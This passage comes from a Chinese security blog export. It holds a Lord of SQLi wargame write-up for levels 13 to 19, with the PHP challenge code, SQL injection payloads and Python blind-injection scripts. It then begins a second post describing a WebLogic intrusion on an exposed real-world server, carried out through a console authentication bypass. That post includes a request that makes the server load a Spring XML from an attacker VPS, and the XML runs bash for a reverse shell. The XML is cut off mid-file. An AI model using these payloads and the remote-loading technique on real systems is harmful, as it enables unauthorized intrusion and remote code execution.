class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>等到admin的pw为：<code>0b70ea1f</code></p>\n<h1 id=\"13-bugbear\"><a href=\"#13-bugbear\" class=\"headerlink\" title=\"13. bugbear\"></a>13. bugbear</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_bugbear where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class=\"subst\">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;bugbear&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了很多，直接贴代码吧，用in来判断字符可以避免使用like、=、regexp等，no可以使用no&gt;1&amp;&amp;no&lt;3来使no指向2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;1||no&lt;3%26%26no&gt;1%26%26mid(pw,&#123;&#125;,1)/**/in(&quot;&#123;&#125;&quot;)&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&amp;no=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, s), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>跑出来密码：<code>52dc3991</code></p>\n<h1 id=\"14-giant\"><a href=\"#14-giant\" class=\"headerlink\" title=\"14. giant\"></a>14. giant</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(strlen($_GET[shit])&gt;<span class=\"number\">1</span>) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/ |\\n|\\r|\\t/i&#x27;</span>, $_GET[shit])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select 1234 from<span class=\"subst\">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"number\">1234</span>]) solve(<span class=\"string\">&quot;giant&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>要让from和表名间出现一个空格，过滤了一些字符，这个很简单，直接用burp进行fuzz，%00-%ff共256种可能，共发现<code>%0b</code>,<code>%0c</code>，可以绕过</p>\n<h1 id=\"15-assassin\"><a href=\"#15-assassin\" class=\"headerlink\" title=\"15. assassin\"></a>15. assassin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_assassin where pw like &#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;assassin&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>like型注入，可以使用通配符<code>%</code>进行注入，先单个跑出来存在的字符为<code>def0129</code>，再进行一位一位的猜解，在输入<code>902%</code>的时候即可通关。</p>\n<h1 id=\"16-SUCCUBUS\"><a href=\"#16-SUCCUBUS\" class=\"headerlink\" title=\"16. SUCCUBUS\"></a>16. SUCCUBUS</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk();</span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/&#x27;</span>,$_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/&#x27;</span>,$_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>);</span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_succubus where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;succubus&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了单引号，但sql语句中存在两个可控点，可以在id参数输入<code>\\</code>将第一个单引号进行转义，后续pw即可输入注入语句进行SQL注入</p>\n<p>payload：<code>1\\&amp;pw=or+1=1--+</code></p>\n<p>闭合后的SQL语句为：<code>**select id from prob_succubus where id=&#39;1\\&#39; and pw=&#39;or 1=1-- &#39;**</code></p>\n<h1 id=\"17-zombie-assassin\"><a href=\"#17-zombie-assassin\" class=\"headerlink\" title=\"17. zombie_assassin\"></a>17. zombie_assassin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  $_GET[<span class=\"string\">&#x27;id&#x27;</span>] = strrev(addslashes($_GET[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">  $_GET[<span class=\"string\">&#x27;pw&#x27;</span>] = strrev(addslashes($_GET[<span class=\"string\">&#x27;pw&#x27;</span>]));</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_zombie_assassin where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;zombie_assassin&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>思路跟16题基本差不多，只是多了个字符翻转</p>\n<p>Paylaod: <code>?id=%00&amp;pw=%231%20ro</code></p>\n<h1 id=\"18-NIGHTMARE\"><a href=\"#18-NIGHTMARE\" class=\"headerlink\" title=\"18. NIGHTMARE\"></a>18. NIGHTMARE</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)|#|-/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(strlen($_GET[pw])&gt;<span class=\"number\">6</span>) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_nightmare where pw=(&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;) and id!=&#x27;admin&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;nightmare&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>Payload:<code>?pw=%27)=0;%00</code></p>\n<p>mysql连等，从左到右依次计算，<code>select id from prob_nightmare where pw=(&#39;&#39;)=0;</code>，pwd=’‘为false，然后0为false，false==false，所以最后语句为<code>select id from prob_nightmare where pw=true</code>，即可绕过</p>\n<h1 id=\"19-xavis\"><a href=\"#19-xavis\" class=\"headerlink\" title=\"19. xavis\"></a>19. xavis</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/regex|like/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_xavis where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;xavis&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>由于结果是韩文，所以要用二分查找加快速度，查出来结果输入进去还是不太对</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;pq2v3qor5eic81d2jsjc3jl41d&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1%27+or+id=&#x27;admin&#x27;+and+ord(mid(pw,&#123;&#125;,1))&gt;&#123;&#125;--+&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">    min_num = <span class=\"number\">44032</span></span><br><span class=\"line\">    max_num = <span class=\"number\">55295</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">abs</span>(max_num-min_num)&gt;<span class=\"number\">1</span>:</span><br><span class=\"line\">        mid = (max_num+min_num)//<span class=\"number\">2</span></span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, mid), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            min_num = mid</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            max_num = mid</span><br><span class=\"line\"></span><br><span class=\"line\">    temp = temp+<span class=\"built_in\">chr</span>(max_num)</span><br><span class=\"line\">    print(temp)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>跑出来的结果<code>우왕굳각각각각각각각각각</code></p>\n","categories":["CTF"],"tags":["SQL注入"]},{"title":"记一次实战weblogic渗透","url":"http://blog.le31ei.top/2020/11/16/记一次实战weblogic渗透/","content":"<p>某次测试中发现一个开放在外网的weblogic，版本为10.3.6，直接输入<code>/console</code>，就能打开管理页面</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112750237.png\" alt=\"image-20201116112750237\"></p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116112728397.png\" alt=\"image-20201116112728397\"></p>\n<p>直接测试<code>http://ip:port/console/css/%252e%252e%252fconsole.portal</code>能绕过console登录，直接进入后台，但后台权限较低，无法直接部署war包，于是根据vulhub，采用<code>FileSystemXmlApplicationContext</code>加载远程的xml进行攻击</p>\n<p><img src=\"/2020/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98weblogic%E6%B8%97%E9%80%8F/image-20201116114020053.png\" alt=\"image-20201116114020053\"></p>\n<p>在远程服务器写入xml文件，并使用python搭建http server，<code>python -m SimpleHTTPServer 5555</code></p>\n<p>xml文件内容写上反弹shell的命令，并在weblogic中访问以下命令：<br><code>http://ip:port/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://vps:5555/rce.xml&quot;)</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>bash<span class=\"tag\">&lt;/<span 